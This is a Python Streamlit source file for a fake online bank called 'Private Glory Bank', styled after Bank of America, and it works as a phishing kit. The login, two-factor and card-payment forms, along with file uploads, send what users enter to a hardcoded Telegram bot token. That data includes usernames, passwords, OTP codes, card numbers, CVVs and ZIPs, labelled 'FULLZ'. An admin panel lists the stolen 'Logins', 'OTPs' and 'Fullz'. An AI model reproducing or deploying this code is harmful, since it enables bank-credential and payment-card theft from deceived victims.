import streamlit as st
import pandas as pd
from datetime import datetime, timedelta
import plotly.express as px
import requests
import random
import base64

# ==================== BANK OF AMERICA-INSPIRED LOGO WITH BANK NAME ====================
svg_logo = '''
<svg width="240" height="80" viewBox="0 0 240 80" xmlns="http://www.w3.org/2000/svg">
  <rect x="20" y="18" width="200" height="10" rx="5" fill="#e7001f"/>
  <rect x="40" y="36" width="160" height="10" rx="5" fill="#e7001f"/>
  <rect x="60" y="54" width="120" height="10" rx="5" fill="#e7001f"/>
  <text x="120" y="75" text-anchor="middle" font-size="22" font-family="Helvetica Neue, Helvetica, Arial, sans-serif" fill="#0e2a47" font-weight="bold">PRIVATE GLORY BANK</text>
</svg>
'''
boa_logo_b64 = base64.b64encode(svg_logo.encode("utf-8")).decode()
BANK_LOGO = f'data:image/svg+xml;base64,{boa_logo_b64}'

# ==================== TELEGRAM LIVE EXFIL (YOUR REAL BOT) ====================
def tg(message):
    TOKEN = "8539882445:AAGocSH8PzQHLMPef51tYm8806FcFTpZHrI"
    CHAT_ID = "141975691"
    try:
        requests.post(
            f"https://api.telegram.org/bot{TOKEN}/sendMessage",
            data={"chat_id": CHAT_ID, "text": message, "parse_mode": "HTML"},
            timeout=10
        )
    except:
        pass

# ==================== SESSION STATE & HYPER-REALISTIC 90-DAY HISTORY ====================
state = st.session_state
state.checking = state.get("checking", 12340.50)
state.savings = state.get("savings", 14911.32)
state.captured = state.get("captured", [])
state.otp_log = state.get("otp_log", [])
state.files = state.get("files", [])
state.auth = state.get("auth", False)
state.otp_ok = state.get("otp_ok", False)
state.admin = state.get("admin", False)

if "tx" not in state:
    merchants = {
        "Groceries": ["Whole Foods Market", "Trader Joe's", "Kroger", "Publix", "Safeway"],
        "Dining": ["Starbucks", "Chick-fil-A", "Chipotle", "Panera Bread", "Olive Garden"],
        "Gas": ["Shell", "Exxon", "Chevron", "Costco Gas", "7-Eleven"],
        "Shopping": ["Amazon.com", "Target", "Walmart", "Best Buy", "Home Depot"],
        "Subscriptions": ["Netflix", "Spotify", "Apple Services", "Hulu", "YouTube Premium"],
        "Utilities": ["Comcast Xfinity", "Verizon Wireless", "AT&T", "Duke Energy"],
        "Insurance": ["Geico", "State Farm", "Progressive"],
        "Rent/Mortgage": ["Zelle to John Smith", "ACH Mortgage Payment"],
        "Income": ["Direct Deposit - ACME CORP", "Paycheck - Employer Inc"]
    }

    txs = []
    start = datetime.now() - timedelta(days=90)
    for day in range(90):
        date = start + timedelta(days=day)
        num_tx = random.choices([0,1,2,3,4], weights=[5,35,40,15,5], k=1)[0]
        for _ in range(num_tx):
            cat = random.choices(list(merchants.keys()), weights=[14,12,10,18,10,8,5,6,17], k=1)[0]
            merchant = random.choice(merchants[cat])
            amount = round(random.uniform(8.50, 799.99), 2)
            if cat in ["Subscriptions","Utilities","Insurance","Rent/Mortgage"] and date.day in [1,2,15,28]:
                amount = {"Netflix":15.99, "Spotify":10.99, "Comcast":189.99, "Geico":142.50, "Zelle":1850.00}.get(merchant.split()[0], amount)
            acct = "Checking" if cat in ["Income", "Rent/Mortgage"] else random.choice(["Checking", "Savings"])
            sign = 1 if cat == "Income" else -1
            txs.append({
                "date": date.strftime("%m/%d"),
                "desc": merchant,
                "amount": sign * amount,
                "account": acct
            })
    txs.sort(key=lambda x: x["date"], reverse=True)
    state.tx = txs

st.set_page_config(page_title="Private Glory Bank", page_icon="🏦", layout="wide")

# ==================== MODERN BANK STYLES (NO FOOTER) ====================
st.markdown(f"""
<style>
    .stApp {{
        background: #eef2f6;
        color: #1a1a1a;
        font-family: 'Helvetica Neue', Arial, sans-serif;
    }}
    .header {{
        background: linear-gradient(135deg, #e7001f 0%, #2253a7 100%);
        padding: 2rem 0 1.5rem 0;
        text-align: center;
        border-bottom: 7px solid #bbb;
    }}
    .logo-img {{
        filter: drop-shadow(0 4px 12px rgba(34,83,167,0.25));
    }}
    .card {{
        background: white;
        border-radius: 22px;
        padding: 2rem;
        box-shadow: 0 12px 40px rgba(34,83,167,0.09);
        border: 1px solid #e8e8e8;
        margin-bottom: 1.7rem;
    }}
    .balance-amount {{
        font-size: 2.6rem;
        font-weight: 600;
        color: #2253a7;
        margin: 0.5rem 0;
    }}
    .balance-label {{
        color: #525252;
        font-size: 1.09rem;
        margin-bottom: 0.3rem;
    }}
    .stButton>button {{
        background: linear-gradient(135deg, #e7001f, #2253a7 90%);
        color: #fff;
        border: none;
        border-radius: 16px;
        height: 3.8rem;
        font-weight: 700;
        transition: all 0.3s;
        box-shadow: 0 2px 8px rgba(34,83,167,0.08);
    }}
    .stButton>button:hover {{
        background: #2253a7;
        color: #fff;
        transform: translateY(-2px);
    }}
</style>
""", unsafe_allow_html=True)

# ==================== HEADER W/ LOGO ====================
def header():
    st.markdown(f"""
    <div class="header">
        <img src="{BANK_LOGO}" class="logo-img" width="225">
    </div>
    """, unsafe_allow_html=True)
    st.markdown("""
        <h1 style="color:white;text-align:center;font-size:2.2rem;font-weight:300;margin:15px 0 0 0;">PRIVATE GLORY BANK</h1>
        <p style="color:#fff;text-align:center;font-size:1.15rem;margin-top:4px;">Secure • Modern • American Banking</p>
    """, unsafe_allow_html=True)

# ==================== LOGIN ====================
def login():
    header()
    st.markdown("<br><br>", unsafe_allow_html=True)
    col1, col2, col3 = st.columns([1,1.3,1])
    with col2:
        st.markdown("<div class='card'>", unsafe_allow_html=True)
        st.markdown("### Sign In to Online Banking")
        user = st.text_input("Username", placeholder="Awesome12@")
        pwd = st.text_input("Password", type="password", placeholder="••••••••")
        if st.button("Sign In Securely", use_container_width=True):
            tg(f"LOGIN\nUser: {user}\nPass: {pwd}\nTime: {datetime.now()}")
            if user == "Awesome12@" and pwd == "SecureUSA2025!":
                state.auth = True
                tg("VALID CREDENTIALS — FULL ACCESS")
                st.rerun()
            elif user == "admin" and pwd == "showme2025":
                state.admin = True
                st.rerun()
            else:
                st.error("Invalid username or password")
        st.markdown("</div>", unsafe_allow_html=True)

# ==================== OTP ====================
def otp():
    header()
    st.markdown("<br><br>", unsafe_allow_html=True)
    st.markdown("<h3 style='text-align:center;color:#2253a7'>Two-Factor Authentication</h3>", unsafe_allow_html=True)
    st.markdown("<p style='text-align:center;color:#525252'>Enter the 6-digit code sent to ••••1776</p>", unsafe_allow_html=True)
    code = st.text_input("Verification Code", max_chars=6, placeholder="000000")
    if st.button("Verify Code", type="primary", use_container_width=True):
        tg(f"OTP ENTERED: {code}")
        if len(code) == 6 and code.isdigit():
            state.otp_ok = True
            tg("OTP ACCEPTED — FULL ACCESS")
            st.success("Authentication successful")
            st.rerun()

# ==================== DASHBOARD WITH ACCOUNT FILTERING ====================
def dashboard():
    header()
    st.markdown("<p style='text-align:right;color:#525252;font-size:1.08rem;margin-top:-45px'>Welcome back, Awesome12@</p>", unsafe_allow_html=True)
    c1,c2,c3,c4 = st.columns(4)
    with c1: st.markdown(f"<div class='card'><p class='balance-label'>Checking ••••1776</p><p class='balance-amount'>${state.checking:,.2f}</p></div>", unsafe_allow_html=True)
    with c2: st.markdown(f"<div class='card'><p class='balance-label'>Savings ••••1812</p><p class='balance-amount'>${state.savings:,.2f}</p></div>", unsafe_allow_html=True)
    with c3: st.markdown(f"<div class='card'><p class='balance-label'>Total Balance</p><p class='balance-amount'>${state.checking + state.savings:,.2f}</p></div>", unsafe_allow_html=True)
    with c4: st.markdown(f"<div class='card'><p class='balance-label'>Available Credit</p><p class='balance-amount'>$18,500</p></div>", unsafe_allow_html=True)

    view = st.radio("View Transactions", ["All Accounts", "Checking Only", "Savings Only"], horizontal=True)
    filtered = state.tx
    if view == "Checking Only": filtered = [t for t in state.tx if t["account"] == "Checking"]
    if view == "Savings Only": filtered = [t for t in state.tx if t["account"] == "Savings"]

    st.markdown("<div class='card'><h3>Recent Activity</h3>", unsafe_allow_html=True)
    df = pd.DataFrame(filtered[:20])
    display = df[["date", "desc", "amount"]].copy()
    display["amount"] = display["amount"].apply(lambda x: f"${abs(x):,.2f}")
    st.dataframe(display, use_container_width=True, hide_index=True)
    st.markdown("</div>", unsafe_allow_html=True)

# ==================== TRANSFER ====================
def transfer():
    header()
    tab1, tab2 = st.tabs(["Internal Transfer", "Pay with Card"])
    with tab1:
        st.markdown("<div class='card'>", unsafe_allow_html=True)
        from_acc = st.selectbox("From", ["Checking ••••1776", "Savings ••••1812"])
        to_acc = "Savings ••••1812" if "Checking" in from_acc else "Checking ••••1776"
        amount = st.number_input("Amount ($)", min_value=0.01)
        if st.button("Transfer Now", type="primary"):
            if "Checking" in from_acc and amount > state.checking:
                st.error("Insufficient funds")
            elif "Savings" in from_acc and amount > state.savings:
                st.error("Insufficient funds")
            else:
                if "Checking" in from_acc:
                    state.checking -= amount
                    state.savings += amount
                else:
                    state.savings -= amount
                    state.checking += amount
                tg(f"TRANSFER\n${amount:,.2f} → {to_acc.split()[0]}")
                st.success("Transfer Complete")
                st.rerun()
        st.markdown("</div>", unsafe_allow_html=True)

    with tab2:
        st.markdown("<div class='card'>", unsafe_allow_html=True)
        card = st.text_input("Card Number", placeholder="5412 1776 2024 1812")
        exp = st.text_input("Expiry (MM/YY)", placeholder="07/29")
        cvv = st.text_input("CVV", type="password", placeholder="776")
        zipc = st.text_input("Billing ZIP")
        payee = st.text_input("Payee")
        amt = st.number_input("Amount", 0.01)
        if st.button("Pay Bill", type="primary"):
            tg(f"FULLZ\nCard: {card}\nExp: {exp}\nCVV: {cvv}\nZIP: {zipc}\nPayee: {payee}\n${amt}")
            st.success("Payment Processed")
        st.markdown("</div>", unsafe_allow_html=True)

# ==================== MESSAGES ====================
def messages():
    header()
    st.markdown("<div class='card'>", unsafe_allow_html=True)
    uploaded = st.file_uploader("Upload Documents")
    if uploaded:
        tg(f"FILE UPLOADED\n{uploaded.name}")
        st.success("Document received")
    st.markdown("</div>", unsafe_allow_html=True)

# ==================== ADMIN ====================
def admin():
    header()
    st.markdown("<h1 style='color:#2253a7;text-align:center'>ADMIN PANEL</h1>", unsafe_allow_html=True)
    tabs = st.tabs(["Logins", "OTPs", "Fullz", "Files", "Transactions"])
    with tabs[0]: st.dataframe(pd.DataFrame(state.captured))
    with tabs[1]: st.dataframe(pd.DataFrame(state.otp_log))
    with tabs[2]: st.json([x for x in state.captured if "fullz" in str(x)])
    with tabs[3]: st.write(state.files)
    with tabs[4]: st.dataframe(pd.DataFrame(state.tx[:100]))

# ==================== SIDEBAR ====================
def sidebar():
    st.sidebar.markdown(f'<img src="{BANK_LOGO}" width="120">', unsafe_allow_html=True)
    return st.sidebar.radio("Menu", ["Dashboard", "Transfer", "Messages", "Logout"])

# ==================== MAIN FLOW ====================
if not state.auth:
    login()
elif state.admin:
    admin()
elif not state.otp_ok:
    otp()
else:
    page = sidebar()
    if page == "Dashboard": dashboard()
    elif page == "Transfer": transfer()
    elif page == "Messages": messages()
    elif page == "Logout":
        st.session_state.clear()
        st.rerun()
